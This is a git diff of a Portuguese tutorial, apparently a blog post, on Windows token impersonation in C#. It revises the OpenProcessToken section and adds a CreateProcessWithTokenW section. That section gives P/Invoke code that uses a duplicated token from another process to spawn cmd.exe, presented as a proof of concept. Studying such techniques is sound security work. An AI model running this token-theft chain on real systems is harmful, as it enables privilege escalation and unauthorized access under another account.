@@ -44,7 +44,7 @@ Note que foi aberto um handle ao processo. A variável que armazenará este hand
 
 ## OpenProcessToken
 
-Agora o objetivo é abrir um handle para o token do processo. Para isso, a `OpenProcessToken` desempenha a função necessária para esta etapa.
+Agora, o objetivo é abrir um handle para o token deste processo. Para isso, a `OpenProcessToken` desempenha a função necessária para esta etapa.
 
 ```csharp
 [DllImport("advapi32", SetLastError = true)]
@@ -59,7 +59,7 @@ static void Main(string[] args)
 		: $"OpenProcessToken SUCCESS: {hToken}" // hToken = handle do token
 	);
 
-	if (hProcess == IntPtr.Zero) Environment.Exit(0);
+	if (tokenPtr == IntPtr.Zero || hToken == IntPtr.Zero) Environment.Exit(0);
 	CloseHandle(hProcess);
 	CloseHandle(tokenPtr);
 }
@@ -68,12 +68,10 @@ static void Main(string[] args)
 Onde:
 
 - `DesiredAccess`: especifica uma máscara de acesso que simboliza os tipos solicitados de acesso ao token.
-- `TokenHandle`: o handle do token de acesso do processo.
+- `TokenHandle`: o handle do token.
 
 
-Ainda falando sobre a [máscara de acesso do token](https://learn.microsoft.com/pt-br/windows/win32/secauthz/access-rights-for-access-token-objects), ela trabalha de forma bastante similar com o `processAccess` do `OpenProcess`. Esta flag é necessária para especificarmos qual o nível de acesso que teremos sobre o token.
-
-Neste caso, como este token (hToken) será duplicado posteriormente, a única permissão necessária, neste caso, é a de `TOKEN_DUPLICATE`, representada pelo valor `0x0002`.
+Ainda falando sobre a [máscara de acesso do token](https://learn.microsoft.com/pt-br/windows/win32/secauthz/access-rights-for-access-token-objects), ela trabalha de forma bastante similar com o `processAccess` do `OpenProcess`. Neste caso, como este token (hToken) será duplicado posteriormente, a única permissão necessária, neste caso, é a de `TOKEN_DUPLICATE`, representada pelo valor `0x0002`.
 
 ## DuplicateTokenEx
 
@@ -133,3 +131,104 @@ Onde, na chamada da API:
 - O valor `0x02000000` é repassado no `dwDesiredAccess`. Este valor simboliza o MAXIMUM_ALLOWED, que significa o máximo permitido.
 - O valor `SecurityImpersonation` é repassado no `SECURITY_IMPERSONATION_LEVEL`. Este valor simboliza que o servidor pode impersonificar o contexto de segurança do cliente em sistemas locais.
 - O valor `TokenImpersonation` é repassado no `TOKEN_TYPE`. Este valor simboliza que o token será do tipo impersonificado.
+
+## CreateProcessWithTokenW
+
+Como última etapa, partiremos para a criação de um novo processo a partir do token que duplicamos.
+
+```csharp
+[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
+struct STARTUPINFO
+{
+	UInt32 cb;
+	string lpReserved;
+	string lpDesktop;
+	string lpTitle;
+	Int32 dwX;
+	Int32 dwY;
+	Int32 dwXSize;
+	Int32 dwYSize;
+	Int32 dwXCountChars;
+	Int32 dwYCountChars;
+	Int32 dwFillAttribute;
+	Int32 dwFlags;
+	Int16 wShowWindow;
+	Int16 cbReserved2;
+	IntPtr lpReserved2;
+	IntPtr hStdInput;
+	IntPtr hStdOutput;
+	IntPtr hStdError;
+}
+
+[StructLayout(LayoutKind.Sequential)]
+struct PROCESS_INFORMATION
+{
+	IntPtr hProcess;
+	IntPtr hThread;
+	int dwProcessId;
+	int dwThreadId;
+}
+
+enum LogonFlags
+{
+	LOGON_WITH_PROFILE = 0x00000001,
+	LOGON_NETCREDENTIALS_ONLY = 0x00000002
+}
+
+[DllImport("advapi32", SetLastError = true, CharSet = CharSet.Unicode)]
+static extern bool CreateProcessWithTokenW(
+	IntPtr hToken,
+	LogonFlags dwLogonFlags,
+	string lpApplicationName,
+	string lpCommandLine,
+	int dwCreationFlags,
+	IntPtr lpEnvironment,
+	string lpCurrentDirectory,
+	[In] ref STARTUPINFO lpStartupInfo,
+	out PROCESS_INFORMATION lpProcessInformation
+);
+
+static void Main(string[] args)
+{
+	STARTUPINFO si = new STARTUPINFO();
+	PROCESS_INFORMATION processInformation = new PROCESS_INFORMATION();
+
+	bool createProcess = CreateProcessWithTokenW(
+		hNewToken,
+		LogonFlags.LOGON_NETCREDENTIALS_ONLY,
+		@"C:\Windows\System32\cmd.exe",
+		null,
+		0,
+		IntPtr.Zero,
+		null,
+		ref si,
+		out processInformation
+	);
+
+	Console.WriteLine(
+		createProcess == false
+		? $"CreateProcessWithTokenW ERROR: {Marshal.GetLastWin32Error()}"
+		: $"CreateProcessWithTokenW SUCCESS: {createProcess}"
+	);
+			
+	CloseHandle(hNewToken);
+}
+```
+
+Alguns dos valores importantes:
+
+- `dwLogonFlags`: a opção de logon.
+- `lpApplicationName`: o binário que será executado na criação de um novo processo.
+- `dwCreationFlags`: os sinalizadores que controlam como o processo é criado.
+- `lpStartupInfo`: um ponteiro para a estrutura STARTUPINFO (que armazena informações como estação de janela, aparência do processo)
+- `lpProcessInformation`: um ponteiro para uma estrutura PROCESS_INFORMATION que recebe informações de identificação para o novo processo, incluindo um identificador para o processo.
+
+Onde, na chamada da API:
+
+- O valor `LOGON_NETCREDENTIALS_ONLY` é repassado no `dwLogonFlags`, sinalizando a criação do logon sem alterar na chave do registro.
+- O caminho do binário CMD.EXE é repassado no `lpApplicationName`, sinalizando a criação de um novo processo cmd.
+- O valor "0" é repassado no `dwCreationFlags`, onde o novo processo obterá os sinalizadores padrões do sistema.
+
+Com isso, se tudo ocorrer bem, um novo processo CMD é spawnado através do token que impersonificamos. Hora da POC!
+
+![Desktop View](https://i.imgur.com/xWazVPa.png)
